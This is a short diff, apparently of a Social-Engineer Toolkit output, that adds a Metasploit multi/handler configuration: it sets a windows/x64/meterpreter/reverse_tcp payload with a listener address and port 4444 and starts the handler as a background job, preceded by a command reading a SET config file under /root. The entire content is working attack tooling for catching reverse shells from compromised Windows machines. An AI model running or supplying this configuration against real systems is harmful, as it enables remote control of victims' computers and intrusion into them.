@@ -1,0 +1,8 @@
+[*] exec: cat /root/.set/meta_config
+
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 172.30.18.66
+set LPORT 4444
+set ExitOnSession false
+exploit -j
